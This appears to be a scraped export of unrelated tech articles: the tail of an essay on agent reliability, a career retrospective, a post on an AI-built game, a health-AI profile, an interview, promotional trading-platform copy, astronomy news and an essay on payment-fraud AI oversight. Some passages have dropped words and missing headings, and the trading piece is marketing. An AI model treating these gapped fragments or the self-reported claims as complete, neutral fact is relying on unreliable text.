self-correction cannot neutralize compounded errors, reliability must come from execution design.</p><p>Flow engineering structures agent work into discrete, externally validated stages rather than relying on one end-to-end prompt.</p><p>Responsibility is decomposed across controlled steps. Each step has defined success criteria. Each transition is validated before execution proceeds.</p><p>The impact is measurable.</p><p>The AlphaCodium study evaluated GPT-4 on CodeContests. Direct prompting achieved 19 percent accuracy. A structured multi-stage workflow raised accuracy to 44 percent.</p><p>That is a 2.3x improvement from workflow design alone. The model did not change. Orchestration did.</p><p>A typical flow-engineered agent operates as follows.</p><p>1.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Parse requirements and validate against the schema</p><p>2.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Generate a solution plan</p><p>3.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Execute implementation steps</p><p>4.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Run automated validation tests</p><p>5.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Route failures to targeted recovery paths</p><p>6.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Aggregate outputs for final verification</p><p>Each boundary acts as a checkpoint. Errors surface early instead of compounding silently.</p><p>External validation enables this structure. Deterministic systems enforce correctness while models contribute reasoning.</p><p>Long-running agents introduce another system’s challenge. Context degrades over time. Earlier assumptions compress or drift.</p><p>Flow-engineered systems externalize state through trackers, artifacts, and persistent memory. Execution grounding survives context compression.</p><p>Anthropic’s production guidance describes complementary patterns: prompt chaining with validation between calls, routing to classify inputs and dispatch to specialized handlers, and orchestrator-workers with a coordinator managing narrow sub-agents.</p><p>The unifying principle is constraint.</p><p>More autonomy increases the compounded error surface. More structure improves reliability.</p><p>If constrained workflows outperform autonomy, the next question becomes architectural.</p><p>Do you need an agent at all?</p><h2>Do You Actually Need an AI Agent</h2><p>If workflows improve reliability, the architectural question becomes unavoidable.</p><p>Anthropic draws a useful distinction. Workflows are “LLMs and tools orchestrated through predefined code paths.” Agents are “LLMs dynamically directing their own processes and tool usage.” The difference is operational. Workflows follow predefined deterministic paths. Agents dynamically decide actions, tools, and sequencing.</p><p>Workflows trade flexibility for predictability. Agents trade predictability for flexibility.</p><p>In production, predictability usually matters more.</p><p>Agents suit exploratory tasks where steps cannot be predefined. Research, investigative analysis, and creative work fall here.</p><p>Workflows suit structured tasks. Document processing, data extraction, compliance transformation, and patterned code migration fit deterministic orchestration.</p><p>Most production systems adopt a hybrid model.</p><p>Agents generate plans. Workflows execute them. Reasoning remains flexible while execution remains controlled.</p><p>Practitioners remain skeptical of unconstrained autonomy in high-reliability systems. Deterministic orchestration continues to outperform open agency across reliability, cost, and observability.</p><p>Even constrained systems retain one constant.</p><h2>What Production Teams Actually Do</h2><p>Theory explains failure. Production practice explains survival.</p><p>Across deployments, reliability emerges from layered system design rather than model autonomy.</p><p>Three operational pillars dominate. Evaluation, observability, and execution speed.</p><p>Teams treat evaluation as infrastructure. Unit tests, review pipelines, grading rubrics, and constrained evaluators anchor reliability measurement.</p><p>Hamel Husain has emphasized grounding evaluation in systematic error analysis before scaling automation. Eugene Yan has written extensively about curated failure sets and binary scoring frameworks.</p><p>Agent testing differs from traditional testing. Outputs are non-deterministic. State accumulates. Tool interactions create emergent failure modes.</p><p>Evaluation becomes continuous.</p><p>Observability forms the second pillar.</p><p>Teams monitor acceptance rates, edits, retries, abandonment, and downstream success.</p><p>Sourcegraph, a code intelligence platform, tracks completion visibility and retention with enough sensitivity to catch 50ms regressions within hours.</p><p>Execution speed forms the third pillar.</p><p>Latency affects reliability. Slow systems amplify retries and drift.</p><p>Cursor reported a 13x speedup after introducing speculative execution. Caching further reduces the fresh failure surface.</p><p>Human oversight spans all three pillars.</p><p>Practitioner experience suggests only 30 to 40 percent of agent tasks succeed without human intervention. Systems must design intervention points explicitly through approval gates and resumable states.</p><p>Reliability emerges from designed collaboration, not autonomy.</p><p>When tolerance thresholds tighten further, redundancy enters the design space.</p><h2>The Consensus Alternative</h2><p>Layered workflows suffice for most systems. High-consequence environments require additional safeguards.</p><p>Consensus agents execute tasks across multiple parallel instances and aggregate results through voting.</p><p>The idea borrows from distributed systems reliability design.</p><p>If a single agent has a five percent error rate, five parallel agents reduce aggregate error to roughly 0.11 percent. Research claims a 14,700x reliability improvement over single-agent execution. Thirteen parallel agents achieve 3.4 defects per million opportunities, which is actual Six Sigma quality.</p><p>This gain depends on the partial independence of errors. Shared failure modes reduce benefit, but redundancy still improves aggregate outcomes.</p><p>The tradeoff is cost. Parallel execution multiplies compute and orchestration overhead.</p><p>Consensus architectures, therefore, appear in high-consequence domains such as financial reconciliation and compliance classification. The goal is not building a perfect agent. It is building a system that fails gracefully when failure would otherwise be expensive.</p><p>Redundancy does not eliminate compounded error. It contains it systemically.</p><p>When reliability requirements exceed single-agent capacity, systems trade autonomy for certainty.</p><p>Which leads to a strategic boundary.</p><h2>When NOT to Build an AI Agent</h2><p>The most valuable skill may be knowing when not to build agents.</p><p>If reliability requirements exceed 95 percent, compounded probability works against automation.</p><p>If failure carries financial or regulatory cost, probabilistic execution becomes difficult to justify. Do not automate what you cannot afford to get wrong.</p><p>If tasks decompose cleanly, deterministic workflows outperform autonomy.</p><p>There is also a motivation trap. Agents are intellectually compelling, but fascination is not a use case.</p><p>The cost reality is harsh. Top SWE-bench agents run $230–360 per benchmark attempt in API costs alone, not counting engineering time or failure handling. Agent systems multiply operational complexity and debugging cost.</p><p>There is also the cost of partial success.</p><p>An agent succeeding 70 percent of the time still requires remediation for the remaining 30 percent.</p><p>Almost works becomes the most expensive failure mode.</p><p>Recognizing these boundaries reflects architectural maturity.</p><p>The agents that succeed in production are the most constrained.</p><p>They operate within narrow domains, structured workflows, and deterministic validation systems with human oversight designed in.</p><p>Compounded error is mathematical. Capability alone does not resolve it.</p><p>You cannot prompt your way around probability.</p><p>Reliability emerges from fewer steps, external validation, constrained actions, and explicit recovery paths.</p><p>Flow engineering improves outcomes through orchestration rather than model advancement.</p><p>Production systems resemble workflows more than autonomous agents.</p><p>Evaluation must precede deployment. Observability must measure behavioral quality.</p><p>When reliability requirements rise, autonomy contracts.</p><p>Remember the table: 90 percent per step degrades to 12 percent over twenty steps. The demo to production gap is not mysterious. Demos operate within narrow probability envelopes. Production expands them.</p><p>Closing that gap requires systems that prevent small failures from cascading.</p><p>The teams that succeed are not building the most intelligent agents. They are building the most reliable systems.</p><p>Autonomy makes for compelling demonstrations.</p><p>Constraint is what survives production.</p><p><em>Research synthesis assisted by Claude.

      "content": "<p>I wrote the original version of this list in 2018, just weeks after trading my graduation cap for a corporate badge. Back then, my biggest shock was realizing there's no \"Spring Break\"!</p><p>Now, as a Senior Engineer who has navigated Amazon, Microsoft and Salesforce, I've realized those early shocks weren't just \"adulting\" milestones. They were foundational lessons for a long-term engineering career.</p><p>Here's the 2026 \"senior-level\" retrospective on what I learned at my first job.</p><h2>1. From \"No More Breaks\" to Extreme Sustainability</h2><p> My first realization was brutal - there are no more summer, winter, or spring breaks. You don't get a \"reset\" button every 15 weeks as you do in a university semester.</p><p> In 2018, I thought this was about losing vacation time. In 2026, I realized it's about sustainability. Engineering isn't a series of sprints followed by a month off. It's a marathon where the terrain never stops changing. You have to learn to manage your energy over a 40-year career, not a 15-week term. If you don't build your own \"rest cycles\" into your daily workflow, the industry will burn you out before you hit your peak.</p><p> I quickly learned I couldn't just speak \"code\". I had to explain things to managers, clients,and  people who didn't know what a pointer was.</p><p> We call this \"stakeholder management\" now, but the core skill is the same. As a senior dev, my value isn't just in the PRs I merge - it's in my ability to translate a complex technical bottleneck into a business risk. If you can't communicate why a refactor matters to someone holding the budget, your code might as well not exist.</p><h2>3. The Power of the \"Stupid\" Question</h2><p> I was terrified of asking questions. I thought if I asked for clarification, my team would realize they'd made a mistake in hiring me.</p><p> Now, I'm often the person in the room asking the \"dumbest\" questions. And I do it on purpose.</p><p>One of the most important senior traits is the courage to stop a meeting and say, \"Wait, I don't actually understand why we're building this.\" That one \"stupid\" question can save the team four hours of wasted work and three weeks of wrong-direction development. In Big Tech, clarity is a competitive advantage.</p><h2>4. Your Degree is the Entry Ticket, Not the Playbook</h2><p> I realized my degree didn't teach me how to navigate a massive legacy codebase or deal with office politics.</p><p> Academic life is \"clean\"! Problems have known solutions and clear rubrics. Professional engineering is messy. You'll spend more time reading messy code and negotiating with humans than you will writing elegant algorithms. The real learning begins when you realize your degree only taught you  to learn, not  to do.</p><p> At my first job, I focused on finishing my tickets. If the ticket was done, I was successful.</p><p> As you grow, you move from \"task ownership\" to \"outcome ownership.\" It's not about whether your code passed the unit tests - it's about whether the feature actually solved the user's problem. A senior engineer cares about the \"why\" and the \"what if,\" making sure the solution actually moves the needle for the company.</p><p>Looking back at my 2018 self, I see someone who was worried about the transition to \"real work.\" Looking back from 2026, I see that the transition never truly ends. We're always onboarding, always learning new \"alphabet soups,\" always refining our craft.</p><p>Which of these lessons hit home for you? Or are you currently in the \"no spring break\" shock phase? Let's talk about it in the comments.</p>",

      "content": "<p>Google Antigravity is a powerhouse. As an agentic development platform, it’s remarkably capable of remembering context and executing complex instructions. But after using it to build a turn-based algorithmic simulation of Genesis, I realized something critical: <strong>The platform is only as smart as the architect directing it.</strong> If you aren't a developer, you’ll find yourself staring at a \"perfect\" piece of software that doesn't actually work. Here is how I used my engineering intuition to bridge the gap between Antigravity’s potential and a finished, accessible game.</p><h2><strong>1. The Monitoring Gap: Building My Own \"Eyes.\"</strong></h2><p>Antigravity itself is built on a VS Code-style architecture. For a screen-reader user, the IDE itself isn't fully accessible yet. I didn't let that stop me. I didn't need to \"read\" the platform's internal logs because I could intuitively visualize where the logic was tripping up.</p><p>However, I needed a way to verify the simulation's state independently. I prompted the agents to install a <strong>custom log-viewer directly into the webpage</strong> of the game. I engineered a window into the machine’s soul so I could monitor the simulation in an environment I could actually navigate.</p><p>Antigravity remembers everything  tell it, but the agents it deploys don't instinctively build software with its own \"memory.\" Initially, the simulation was stateless. The agents would generate a brilliant turn of scripture and then immediately \"forget\" the genealogical data or world-state for the next turn.</p><p>A non-developer would have been baffled as to why the AI was \"losing its mind.\" I knew the problem was architectural. I had to instruct the agents to design a system where the event logs were fed back into the AI’s prompt as a persistent state-bridge. The platform was capable, but it took a human to tell the agents to  for the software.</p><h2><strong>3. Theology Meets Sci-Fi: \"Let There Be Aliens.\"</strong></h2><p>The simulation took a wild turn when I issued the command:  Suddenly, the theology shifted. The agents interpreted the \"Sons of God\" as \"Star-Beings.\" In my logs, Cain wasn't just jealous of Abel—he was envious of the aliens' freedom.</p><p>But then, the loop happened. From Year 121 down to Year 9, the narrator got caught in a recursive trap, repeating the same \"Star-Being\" revelations over and over. I didn't need a visual debugger to tell me the context window was being flooded by its own previous outputs. I knew exactly how to restructure the prompt to flush the buffer and force the simulation to progress.</p><p>To keep the project within Google’s free tier while using the high-performance Gemini 2.5 Flash model, I had to be smart about infrastructure. I had the agents build a <strong>hot-swappable API key uploader</strong> with a built-in test feature. It’s the kind of practical \"dev-ops\" move that a casual user would never think to ask for, but it’s what kept the project alive and cost-effective.</p><p>Google Antigravity is excellent. It is a robust, memory-capable platform that can spin up code at a staggering pace. But it isn't a \"replacement\" for a developer.</p><p>A normal person without development experience would have hit a wall the moment the simulation became stateless or the IDE became inaccessible. They wouldn't have known how to \"see\" the errors or how to give the software a memory. Antigravity provides the muscle, but the  provides the intuition. I could visualize how the system  work and knew exactly why it wasn't—and that’s something no agent can replicate.</p>",

      "content": "<p>By focusing on one of healthcare’s most overlooked problems—documentation—Foster AI is using AI to reduce doctor burnout and quietly build India’s healthcare data foundation.</p><p>India’s healthcare system does not suffer from a lack of intent. It suffers from a lack of time.</p><p>With a doctor-to-patient ratio of roughly 1:1600—far below the World Health Organisation’s recommended 1:1000—clinicians in public hospitals routinely see 30 to 50 patients a day. In that environment, documentation becomes the casualty. Notes are rushed, handwritten, fragmented or lost entirely, not because doctors don’t care, but because the system leaves no room for anything beyond immediate care.</p><p>This is the problem Foster AI decided to tackle—not diagnostics, not predictive medicine, but documentation.</p><p>Anukriti Chaudhari, Foster AI’s co-founder, did not start her career in healthcare. An IIT Bombay graduate, she spent time in consulting before working at the iSpirit Foundation, where she was exposed to India’s large-scale digital public infrastructure efforts such as Aadhaar and UPI. That experience shaped her understanding of how foundational systems enable scale—and how absent such foundations are in healthcare.</p><p>“The long-term vision was always healthcare,” Chaudhari has said. “But it became clear that without structured data, everything else is built on sand.”</p><p>Instead of attempting to replace doctors or automate clinical decision-making, Foster AI took a narrower—and more pragmatic—approach. The company built an AI-driven documentation platform that allows doctors to dictate notes after consultations, using a simple mobile or web interface. The system processes voice inputs, uploaded reports and other clinical data to generate structured outputs such as prescriptions, discharge summaries and clinical notes.</p><p>One insight from early deployments stood out: accents were a bigger challenge than languages.</p><p>Doctors often prefer to speak after consultations, using medical terminology rather than recording conversations live. Western-trained models struggled with Indian accents, patient names and drug references. Foster AI responded by customising open-source models trained on Indian datasets, while allowing doctors to correct vocabulary over time—similar to how predictive text adapts to individual users.</p><p>The payoff was immediate. Tasks that previously took up to an hour, such as preparing discharge summaries, could be completed in minutes. Reviewing patient histories for second opinions dropped from over ten minutes to one or two. For doctors, this translated directly into reduced administrative burden and more time for patient care.</p><p>Given healthcare’s sensitivity, Foster AI built strict guardrails into the system. The AI does not generate information beyond source inputs, and every output is traceable back to the original audio or documents. The company describes its approach as assistive rather than autonomous—borrowing from the human-in-the-loop philosophy used in autonomous driving.</p><p>To validate its impact, the team conducted a year-long real-world evaluation involving more than 300 patients in collaboration with a major cancer hospital. According to the company, the study showed zero hallucinations, a 45 percent reduction in documentation errors and a 79 percent reduction in documentation time compared to manual notes.</p><p>Regulatory alignment was treated as a design constraint rather than an afterthought. Patient data remains within Indian geography, follows strict access controls and aligns with frameworks such as HIPAA and India’s evolving DPDP guidelines.</p><p>Foster AI’s decision to focus on public hospitals was deliberate. Nearly 80 percent of India’s patients receive care through government institutions, where scale, complexity and data gaps are most pronounced. The company is now expanding deployments beyond its initial pilot at Tata Memorial Hospital to institutions including AIIMS, PGI and JIPMER.</p><p>In an ecosystem often driven by rapid scaling and headline-grabbing claims, Foster AI represents a quieter model of healthcare innovation—one that prioritises trust, workflow fit and measurable impact. By fixing documentation first, the company is laying the groundwork for a future where India’s healthcare system finally has a reliable memory.</p>",

      "content": "<h2>So let’s start! Tell us a bit about yourself. For example, name, profession, and personal interests.</h2><p>I am Yash, currently an undergrad at the Indian Institute of Technology Roorkee, studying Materials Engineering. Also, I am a part of the Blockchain Society of IIT Roorkee. I am more into developing on blockchain, but recently developed a great interest in writing about it. Personally I feel, its more about awareness and spreading knowledge rather than only building over it, I like researching over different types of topics from any field. I like to think over the future of blockchain and how are we moving towards it.</p><h2>Interesting! What was your latest Hackernoon Top Story about?</h2><p>Ummm, I recently wrote about Stealth Addresses, and that is the only story I have on Hackernoon, and to be honest its the first thing I have ever written on. Since I have been into blockchain for over a year now, I’ll be writing many more.</p><h2>Do you usually write on similar topics? If not, what do you usually write about?</h2><p>Not really, I like writing on topics after researching them thoroughly. Additionally, I enjoy developing ideas on top of the research I conduct, and then I try to convey the results of my research. I usually write on blockchain topics that are often misunderstood or considered to be tough to understand, but are important for development. I am planning to write on Quantum safety in crypto next, I’ll start soon hopefully.</p><h2>Great! What is your usual writing routine like (if you have one)?</h2><p>I don’t have a dedicated writing routine. It is a process: first, research, then develop on it, then do more research, then write about it.</p><h2>Being a writer in tech can be a challenge. It’s not often our main role, but an addition to another one. What is the biggest challenge you have when it comes to writing?</h2><p>Over the years, I’ve found that I like tech, but I am not better than others at writing about tech. Many people who are involved in tech usually suck at technical writing. I find it an advantage that I can clearly convey my thoughts about what I am going to build upon and what is next in the tech field. The biggest challenge so far is to find a topic that is writable upon, writing over how AI is useful, how AI this and that is useless crap. I don’t like to be in an AI bubble. I like to provide real research information about technically heavy fields in the ecosystem.</p><h2>What is the next thing you hope to achieve in your career?</h2><p>Umm, as an undergrad, I aspire to find a stable internship in either writing or core development. I’ll choose writing anyday ofc. And then a stable job.</p><h2>Wow, that’s admirable. Now, something more casual: What is your guilty pleasure of choice?</h2><p>Okay, now we have real talk! I like to delay my work until I have some real pressure on my back, because my toxic trait thinks I can pull off anything under pressure. I do not know how many people feel the same, but yeah, I enjoy it, but feel real guilt after it backfires hard.</p><p>I play chess, and I am a certified cinephile; test me, and I’ll name every movie you ask about.</p><p>In the near future, I’ll continue writing on often-ignored topics in blockchain, Zero Knowledge Wormholes, Quantum Safety, and many more.</p><p>I am a newcomer to the platform, and it already feels good to me. I think it’s really soon to give an opinion. I’ll have to give another MeetTheWriter for the opinion, I guess.</p><p>It was great to meet you all.</p><p>I’ll keep writing frequently, for any questions, suggestions, and internship offers, ping me at X - @offee_co.</p>",

      "content": "<h3><strong>Multi-Asset Momentum: Diversification Drives Activity on SIFX</strong></h3><p>Global retail trading activity continues to evolve, with traders increasingly shifting from single-market exposure toward diversified, cross-asset strategies. In this environment, SIFX has reported measurable growth in multi-asset trading activity across its platform, reflecting broader market trends seen throughout 2026.</p><p>According to platform data, users are engaging more actively across forex, commodities, cryptocurrencies, and equity-linked CFDs rather than concentrating on a single asset class. This diversification pattern suggests a maturing user base that is seeking flexibility and broader exposure amid fluctuating global market conditions.</p><p><a href=\"https://sifx.com/why-choose-us/\">Multi-asset trading</a> has become increasingly common among retail participants as volatility rotates between asset classes. Currency movements, commodity price swings, equity index fluctuations, and digital asset volatility rarely peak simultaneously, creating opportunities for traders who can shift capital efficiently.</p><p>SIFX’s infrastructure allows users to move between asset classes within a unified account environment. The platform’s structure supports this shift without requiring additional account setups or operational complexity, which may partially explain the rise in cross-asset participation.</p><p><strong>Growth Across Key Markets</strong></p><p>Platform activity indicates particular growth in:</p><ul><li>Forex trading, driven by macroeconomic rate expectations&nbsp;</li><li>Commodities, especially gold and energy products&nbsp;</li><li>Cryptocurrency CFDs, amid renewed volatility cycles&nbsp;</li><li>Equity indices, as traders respond to regional economic data&nbsp;</li></ul><p>This distribution reflects a balanced engagement model rather than dependence on a single trending market.</p><h3>Mobile Access Supporting Higher Activity</h3><p>Part of the increase in multi-asset engagement is linked to improved mobile accessibility. As traders increasingly monitor markets in real time, the ability to switch between instruments quickly from mobile devices has become operationally significant.</p><p>SIFX’s mobile trading environment mirrors its desktop functionality, enabling traders to adjust positions and manage exposure across markets without delay. This level of access appears to support more dynamic portfolio management.</p><h3>Margin Usage and Risk Management</h3><p>The rise in multi-asset participation has also led to more structured margin usage. Traders diversifying across markets must manage exposure carefully, particularly when using leverage. SIFX’s framework provides visibility into margin requirements and risk levels, supporting more informed allocation decisions.</p><p>While leverage can amplify returns, disciplined risk management remains central to sustainable trading activity.</p><p>The reported growth in multi-asset trading on SIFX aligns with broader retail trading developments globally. Traders are increasingly looking for platforms that combine flexibility, efficiency, and operational clarity within a single ecosystem.</p><p>Rather than positioning itself around a single asset trend, SIFX appears to be benefiting from structural changes in trader behaviour — namely, the preference for diversified strategies supported by accessible, responsive technology.</p><p>As 2026 progresses, sustained engagement across multiple asset classes may prove more indicative of platform maturity than short-term spikes in individual markets.</p><h3>Frequently Asked Questions (FAQs)</h3><ul><li>**What does “multi-asset trading” mean on SIFX?\n\\ Multi-asset trading refers to operating across different market categories — such as forex, commodities, cryptocurrencies, and indices — within a single trading account on SIFX.</li><li>**Why is multi-asset activity increasing on SIFX?\n\\ Traders are increasingly diversifying exposure instead of focusing on one market.

      "content": "\"A surprisingly ravenous black hole from the dawn of the universe is breaking two big rules,\" reports Live Science. \"It's not only exceeding the 'speed limit' of black hole growth but also generating extreme X-ray and radio wave emissions — two features that are not predicted to coexist...\" \n\n\"How is this rule-breaking behavior even possible? In a paper published Jan. 21 in The Astrophysical Journal, an international team of researchers observed ID830 in multiple wavelengths to find an answer....\"\n\n\nAs they attract gas and dust, this material accumulates in a swirling accretion disk. Gravity pulls the material from the disk into the black hole, but the infalling material generates radiation pressure that pushes outward and prevents more stuff from falling in. As a result, black holes are muzzled by a self-regulating process called the Eddington limit... Its X-ray brightness suggests that ID830 is accreting mass at about 13 times the Eddington limit, due to a sudden burst of inflowing gas that may have occurred as ID830 shredded and engulfed a celestial body that wandered too close. \"For a supermassive black hole (SMBH) as massive as ID830, this would require not a normal (main-sequence) star, but a more massive giant star or a huge gas cloud,\" study co-author Sakiko Obuchi, an observational astronomer at Waseda University in Tokyo, told Live Science via email. Such super-Eddington phases may be incredibly brief, as \"this transitional phase is expected to last for roughly 300 years,\" Obuchi added. \n\nID830 also simultaneously displays radio and X-ray emissions. These two features are not expected to coexist, especially because super-Eddington accretion is thought to suppress such emissions. \"This unexpected combination hints at physical mechanisms not yet fully captured by current models of extreme accretion and jet launching,\" the researchers said in a statement. So while ID830 is launching massive radio jets, its X-ray emissions appear to originate from a structure called a corona, produced as intense magnetic fields from the accretion disk create a thin but turbulent billion-degree cloud of turbocharged particles. These particles orbit the black hole at nearly the speed of light, in what NASA calls \"one of the most extreme physical environments in the universe.\" Altogether, ID830's rule-breaking behaviors suggest that it is in a rare transitional phase of excessive consumption — and excretion. This incredible feeding burst has energized both its jets and its corona, making ID830 shine brightly across multiple wavelengths as it spews out excess radiation. \n\nAdditionally, based on UV-brightness analysis, quasars like ID830 may be unexpectedly common, the researchers said. Models predict that only around 10% of quasars have spectacular radio jets, but these energetic objects could be significantly more abundant in the early universe than previously suggested. Most importantly, ID830 also shows how SMBHs can regulate galaxy growth in the early universe. As a black hole gobbles matter at the super-Eddington limit, the energy from its resultant emissions can heat and disperse matter throughout the interstellar medium — the gas between stars — to suppress star formation. As a result, ancient SMBHs like ID830 may have grown massive at the expense of their host galaxies.",

      "content": "<p>Imagine: You are standing in the checkout line with your credit card in hand after buying groceries and the terminal flashes red and says \"Card declined\". You try again and still the same result. You are embarrassed at this point, so you pull out another card. You know you have got plenty of money in your account, but an AI agent somewhere thinks otherwise. Or worse, it thinks you are doing fraud, so it didn't approve any of your transactions.</p><p>This is happening to so many people every day as payment processors are deploying increasingly autonomous AI systems that make split-second decisions about your money.</p><p>AI agents that are responsible for processing your payments are getting really smart, fast and autonomous. However, they are also making mistakes that cost billions and frustrate customers at unprecedented scale. I've spent the last few years deep in the payments infrastructure world, and I'm watching an industry grapple with a tech that is simultaneously essential and terrifying.</p><p>This is the paradox of agentic AI in payments. And if left unsolved, the entire foundation of e-commerce is at risk.</p><h2>The $200 Billion Problem Nobody's Talking About</h2><p>Global payment fraud losses are projected to exceed $200 billion by 2026 as per <a href=\"https://juniperresearch.com/press/online-payment-fraud-losses-to-exceed-206-billion\">Juniper Research</a>. At the same time, legitimate transactions that are incorrectly flagged as fraud (false positives) cost merchants an estimated $443 billion annually (<a href=\"https://ravelin.com/blog/reduce-false-positives-fraud\">source</a>). That is more than double the actual fraud loss.</p><p>We are losing twice as much money from being too careful as compared to the losses to actual criminals.</p><p>Studies like <a href=\"https://bigcommerce.com/glossary/false-declines\">these</a> show that 33% of customers who have a legit transaction declined, will not use that payment method with that merchant ever again. One false positive, one AI mistake and the bank has lost that customer for life.</p><p>This is the paradigm shift every payment company has to deal with these days. They block too many transactions, and they hemorrhage revenue and trust. But blocking too few and that's a field day for fraudsters.</p><p>Traditional rule-based systems cannot handle this complexity anymore. The fraud patterns are too sophisticated, volumes too high and the speed requirements are too demanding. This is where agentic AI shines. Autonomous systems can make thousands of decisions per second, learn from patterns humans would never stop and adapt to new fraud tactics in real-time.</p><p>But here's where it gets dangerous.</p><h2>Why Payments Are the Worst Possible Place to Deploy Autonomous AI</h2><p>Deploying Agentic AI in payments is like playing chess with real money, where every move happens in milliseconds and you are playing against opponents who study every decision.</p><p>After each card swipe, the AI agent has about 200-300 milliseconds, at best, to make a decision (see Visa’s <a href=\"https://developer.visa.com\">documentation</a> for the timeline of the decision window in payments). And once the decision is made, especially involving money movement, reversing it is extremely difficult.</p><p>Compare this to a content recommendation algorithm where a bad suggestion means someone watches a mediocre movie. This is real money movement which has real consequences.</p><h3>Second: Every Transaction is High Stakes</h3><p>An AI agent might think that a $20 transaction is trivial and reject it because it sensed fraud. But that might mean a declined transaction at a pharmacy counter which results in the customer not being able to buy their medication. Unlike systems where errors can be averaged out, every payment decision is a high-value event for someone.</p><p>Payments space is one of the most adversarial environments possible. Fraudsters actively study AI behavior patterns, test card numbers at scale using ML to identify weaknesses in the fraud detection systems. They are not just attacking the system, they attack AI itself. And they are getting better at it every day.</p><h3>Fourth: The Regulatory Gauntlet</h3><p>Payments industry is also one of the most heavily regulated sectors. It is not enough to say to regulators that \"AI blocked someone's rent but neural network detected fraud\". There are anti-money laundering laws, KYC requirements, data privacy requirements like <a href=\"https://gdpr.eu\">GDPR</a> and industry standards like <a href=\"https://pcisecuritystandards.org\">PCI-DSS</a>. Every AI decision needs to be explainable, auditable and defensible. Companies cannot afford to not understand the decisions AI made or there is a legal liability chaos waiting to happen that would cost millions in fines and settlements.</p><h2>The Triad of Risk: A System Designed to Fail</h2><p>This problem is wickedly complex because the three main risks in payments are fundamentally interconnected in ways that make optimization nearly impossible.</p><p>False Positives hurt customer experience and revenue. Fraud directly destroys value through stolen money. Reducing false positives by making AI less aggressive will make fraud rate go up. Cracking down on fraud will make the false positives rate increase which would make customers leave. Optimizing purely for revenue would just enable fraud that would destroy long term value. This is a three-body problem in finance and no perfect equilibrium exists.</p><p>Traditional approaches cannot solve this, but there's a path forward.</p><h2>Building AI Agents That Don't Destroy Value (Or Trust)</h2><p>These three mechanisms mentioned below are battle tested approaches that actually work when you are processing millions of transactions with real money at stake.</p><h3>Mechanism 1: Human-in-the-Loop</h3><p>The question should not be whether to use human oversight or not, it should be where and how to use it most effectively. A mature HITL system monitors transactions continuously using ML models trained on millions of historical events. When it spots something suspicious like unusual purchase amounts, geographic anomalies, device fingerprints that don't match or velocity patterns that suggest stolen cards, then it doesn't automatically block the transaction. Instead, for high-value or ambiguous cases at least, it routes the decision to a human fraud analyst.</p><p>The advantage is that a skilled analyst understands context that AI still struggles with. For example, someone buying plane tickets and then making purchase in a foreign country is not fraud, it means the customer is on vacation probably. The human provides judgement, empathy, and contextual understanding.</p><p>Another advantage of HITL system is that every decision that a human makes becomes training data for the agent. This creates a virtuous cycle. AI handles clear-cut cases autonomously and gets better over time. Whereas, humans focus on complex edge cases where their expertise adds maximum value.</p><p>However, HITL costs dearly in latency and money. Skilled analysts are not cheap and if your AI flags too many transactions, then you overwhelm the reviewers and system breaks down. That's why it is extremely important to calibrate this system cautiously.</p><h3>Mechanism 2: Guardrails That Actually Work</h3><p>Think of guardrails as lane markers on a highway. They stop the cars from veering off the road. In payments, these guardrails are hard constraints that AI cannot violate.</p><p>: False positive rate must stay below 2%, p999 transaction processing must remain under 300ms and fraud detection catch rate must be more than 95% for known fraud patterns. When the performance drifts from these thresholds, alerts fire immediately.</p><p>: The AI must verify that it complies with data privacy rules, sanctions lists, anti-money laundering protocols before approving any transaction. These should be treated as embedded constraints that AI literally cannot bypass.</p><p>: These monitor AI's behavior itself for anomalies. For example: Is AI suddenly approving more high-risk transactions, or has its confidence score distribution changed, or are its decisions faster or slower than normal?</p><p>These meta-level monitors would catch problems before they cause catastrophic damage. The best payment companies would run real-time dashboards that give operators instant visibility into AI behavior patterns across millions of decisions. They won't wait for quarterly reviews to discover their AI has gone off the rails.</p><h3>Mechanism 3: Constrained Agent Design</h3><p>The most powerful and effective approach would be to build safety directly into AI's architecture. This is about making it structurally impossible for AI to cause certain types of harm.</p><p>: Instead of one super-intelligent agent that handles everything, build multiple specialized agents with narrow domains. For example, one agent only handles fraud detection for card-not-present transactions under $100, other only handles in-person transactions at gas stations, etc. By limiting scope, potential damage is also limited. If the gas station agent malfunctions, it would only affect gas station transactions. The agent can be shut down without disrupting the entire payment ecosystem.</p><p>: These are functional constraints that AI cannot violate. For example, \"Never approve a transaction that exceeds available balance\", or \"Never process payments to sanctioned entities\". These would act as a safety net such that if AI's learned model fails, these hard rules would ensure baseline safety.</p><p>: Implement principle of least privilege. Each AI agent has exactly the permissions it needs for the specific task it is designed to do and no more. For example, a fraud detection agent can flag transactions, but cannot access customer data beyond what's necessary. It cannot modify account balances or transaction routing.</p><p>: Multiple agents need to agree in order to approve a high-stakes decision. For instance, approving a large wire transfer would require the fraud scoring agent, compliance agent, risk assessment agent and customer behavior agent to agree. Only if all four agree, the transaction goes through. One dissenting agent escalates to human review. This redundancy creates resilience as well. One agent's error is unlikely to cause catastrophic failure because other agents provide checks and balances.</p><h2>The Integration That Actually Matters</h2><p>The successful payment companies that deploy agent AI don't just choose one mechanism. They integrate all three in tandem. They build constrained agent designs to encode safety from ground up, then layer monitoring and guardrails to provide continuous oversight and then implement HITL workflows at critical decision points where human judgement remains irreplaceable.</p><p>This defense-in-depth strategy means no single point of failure. The companies that succeed treat this as a systems design problem. They architect the entire ecosystem containing agents, oversight, feedback loops, escalation paths, monitoring and governance along with safety and effectiveness built in from day one.</p><p>Agentic AI in payments is already here and it is about to scale dramatically.</p><p>Volume has outgrown human capacity, fraud sophistication requires AI-level responses, customer expectations demand speed, and competitive pressure ensures adoption.</p><p>The question isn't whether we'll deploy autonomous AI in payments, but it's whether we'll deploy it responsibly.</p><p>The companies that win aren't the ones with the most sophisticated AI models. They're the ones that understand the sociotechnical system and the interplay between technology, humans, regulations, incentives and trust. They recognize that deploying agentic AI isn't a one-time project but a continuous process of adaptation. Fraud patterns evolve, regulations change, customer expectations shift. The AI systems, monitoring mechanisms, HITL workflows and constrained designs must all evolve continuously. This requires dedicated teams, ongoing investment and a culture that values both innovation and safety.</p><p>The future of payments will be shaped by autonomous AI agents. The only question is whether you'll deploy it with the oversight it requires, or learn that lesson the expensive way.</p>",
